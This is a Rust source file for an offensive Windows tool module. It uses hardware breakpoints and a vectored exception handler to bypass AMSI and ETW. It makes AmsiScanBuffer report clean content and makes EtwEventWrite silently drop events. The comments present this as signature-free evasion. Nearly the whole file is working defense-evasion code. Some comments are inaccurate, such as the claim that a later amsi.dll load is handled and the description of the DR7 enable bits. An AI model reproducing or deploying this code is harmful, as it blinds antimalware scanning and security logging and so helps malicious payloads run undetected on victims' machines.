//! Hardware Breakpoint (HWBP) engine — AMSI and ETW bypass.
//!
//! Mechanism:
//!   1. Install a Vectored Exception Handler (VEH).
//!   2. Set DR0 to the address of AmsiScanBuffer inside amsi.dll.
//!   3. Set DR1 to the address of EtwEventWrite inside ntdll.dll.
//!   4. When execution hits those addresses the CPU fires a EXCEPTION_SINGLE_STEP (0x80000004).
//!   5. In the VEH we intercept, modify the return value / first argument, and resume.
//!
//! This technique does NOT patch any bytes in memory — zero static signatures.
//! Reference: "Red Team Notes — HWBP AMSI bypass"

#![cfg(target_os = "windows")]

use windows_sys::Win32::{
    Foundation::{EXCEPTION_SINGLE_STEP, NTSTATUS},
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, CONTEXT, EXCEPTION_POINTERS,
        },
        LibraryLoader::{GetModuleHandleW, GetProcAddress},
        Threading::{GetCurrentThread},
    },
};

static AMSI_SCAN_BUFFER_ADDR: std::sync::atomic::AtomicUsize =
    std::sync::atomic::AtomicUsize::new(0);
static ETW_EVENT_WRITE_ADDR: std::sync::atomic::AtomicUsize =
    std::sync::atomic::AtomicUsize::new(0);

/// Install HWBP on AmsiScanBuffer to neuter AMSI at the hardware level.
pub fn install_amsi_bypass() {
    unsafe {
        let amsi = GetModuleHandleW(encode_wide("amsi.dll").as_ptr());
        if amsi == 0 {
            return; // amsi.dll not loaded yet — the VEH handler below catches it on first call.
        }
        let proc = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr());
        if let Some(addr) = proc {
            let addr = addr as usize;
            AMSI_SCAN_BUFFER_ADDR.store(addr, std::sync::atomic::Ordering::SeqCst);
            set_hwbp(addr, Dr::Dr0);
        }
    }

    // Install our VEH handler once.
    static INSTALLED: std::sync::atomic::AtomicBool =
        std::sync::atomic::AtomicBool::new(false);
    if !INSTALLED.swap(true, std::sync::atomic::Ordering::SeqCst) {
        unsafe {
            AddVectoredExceptionHandler(1, Some(veh_handler));
        }
    }
}

/// Install HWBP on EtwEventWrite to silently drop ETW events.
pub fn install_etw_bypass() {
    unsafe {
        let ntdll = GetModuleHandleW(encode_wide("ntdll.dll").as_ptr());
        if ntdll == 0 { return; }
        let proc = GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr());
        if let Some(addr) = proc {
            let addr = addr as usize;
            ETW_EVENT_WRITE_ADDR.store(addr, std::sync::atomic::Ordering::SeqCst);
            set_hwbp(addr, Dr::Dr1);
        }
    }
}

// ── VEH handler ───────────────────────────────────────────────────────────────

unsafe extern "system" fn veh_handler(ptrs: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let rec  = (*ptrs).ExceptionRecord;
    let ctx  = (*ptrs).ContextRecord;

    if (*rec).ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rip = (*ctx).Rip as usize;

    // AMSI bypass: AmsiScanBuffer → spoof return value to AMSI_RESULT_CLEAN (0)
    if rip == AMSI_SCAN_BUFFER_ADDR.load(std::sync::atomic::Ordering::SeqCst) {
        // Set RAX = 0 (S_OK / AMSI_RESULT_CLEAN) and skip the function body
        // by setting RIP to the return address (pop from stack).
        let rsp = (*ctx).Rsp as *const usize;
        (*ctx).Rip = *rsp as u64;         // return address
        (*ctx).Rsp = (*ctx).Rsp + 8;      // pop return address off stack
        (*ctx).Rax = 0;                   // AMSI_RESULT_CLEAN
        // Re-arm DR0 (cleared on exception)
        set_hwbp_on_ctx(ctx, AMSI_SCAN_BUFFER_ADDR.load(std::sync::atomic::Ordering::SeqCst), Dr::Dr0);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ETW bypass: EtwEventWrite → return STATUS_SUCCESS immediately
    if rip == ETW_EVENT_WRITE_ADDR.load(std::sync::atomic::Ordering::SeqCst) {
        let rsp = (*ctx).Rsp as *const usize;
        (*ctx).Rip = *rsp as u64;
        (*ctx).Rsp = (*ctx).Rsp + 8;
        (*ctx).Rax = 0; // STATUS_SUCCESS
        set_hwbp_on_ctx(ctx, ETW_EVENT_WRITE_ADDR.load(std::sync::atomic::Ordering::SeqCst), Dr::Dr1);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}

// ── Debug register helpers ────────────────────────────────────────────────────

#[derive(Clone, Copy)]
enum Dr { Dr0, Dr1, Dr2, Dr3 }

unsafe fn set_hwbp(addr: usize, dr: Dr) {
    // We need to set DRx via NtSetContextThread on the current thread.
    // For Phase 1 we use a dummy CONTEXT approach via GetThreadContext/SetThreadContext.
    use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext};
    use windows_sys::Win32::System::Threading::GetCurrentThread;

    let thread = GetCurrentThread();
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = 0x0010; // CONTEXT_DEBUG_REGISTERS

    if GetThreadContext(thread, &mut ctx) != 0 {
        set_hwbp_on_ctx(&mut ctx, addr, dr);
        SetThreadContext(thread, &ctx);
    }
}

unsafe fn set_hwbp_on_ctx(ctx: *mut CONTEXT, addr: usize, dr: Dr) {
    match dr {
        Dr::Dr0 => (*ctx).Dr0 = addr as u64,
        Dr::Dr1 => (*ctx).Dr1 = addr as u64,
        Dr::Dr2 => (*ctx).Dr2 = addr as u64,
        Dr::Dr3 => (*ctx).Dr3 = addr as u64,
    }

    // DR7: enable local breakpoint for the chosen register.
    // Bits [1,3,5,7] = local enable; bits [16-19,20-23,24-27,28-31] = condition/size.
    let bit = match dr {
        Dr::Dr0 => 0,
        Dr::Dr1 => 2,
        Dr::Dr2 => 4,
        Dr::Dr3 => 6,
    };
    (*ctx).Dr7 |= 1u64 << bit; // set local enable bit
}

fn encode_wide(s: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;
    std::ffi::OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}
